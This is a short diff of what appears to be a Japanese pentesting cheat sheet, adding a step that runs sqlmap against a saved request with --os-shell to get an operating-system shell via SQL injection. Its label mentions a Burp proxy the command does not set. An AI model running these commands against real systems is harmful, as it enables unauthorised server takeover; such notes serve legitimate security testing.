@@ -37,3 +37,8 @@ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 ```
 sqlmap -r get.txt -p search --os-shell
 ```
+
+4. sqlmapにburpのproxyを設定してデバッグ実行
+```
+sqlmap -r ./get.txt -p <parameter name> --os-shell
+```
